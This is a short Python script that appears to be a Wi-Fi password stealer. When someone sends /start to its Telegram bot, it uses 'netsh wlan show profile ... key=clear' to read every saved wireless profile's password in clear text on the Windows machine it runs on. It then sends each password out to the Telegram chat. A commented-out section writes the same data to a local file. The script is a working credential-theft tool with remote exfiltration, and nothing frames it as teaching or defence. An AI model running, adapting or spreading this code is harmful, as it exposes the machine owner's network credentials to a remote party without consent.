import subprocess

import telebot

from auth_data import token


# def extract_wifi_passwords():
#   profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
# print(profiles_data)
#
# for item in profiles_data:
#    print(item)

#  profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
# print(profiles)

# for profile in profiles:
#    profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split(
#       '\n')
# print(profile_info)
#       try:
#          global password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
#     except IndexError:
#        password = None

# print(f'Profile: {profile}\nPassword; {password}\n{"#" * 20}')
# print(password)

#   with open(file='wifi_passwords.txt', mode='a', encoding='utf-8') as file:
#      file.write(f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n')


def telegram_bot(token1):
    bot = telebot.TeleBot(token1)

    @bot.message_handler(commands=["start"])
    def start_message(message):
        profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
        profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
        for profile in profiles:
            profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(
                'utf-8').split(
                '\n')
            try:
                password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
            except IndexError:
                password = None
            bot.send_message(message.chat.id, f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n')
    bot.polling()


if __name__ == '__main__':
    telegram_bot(token)
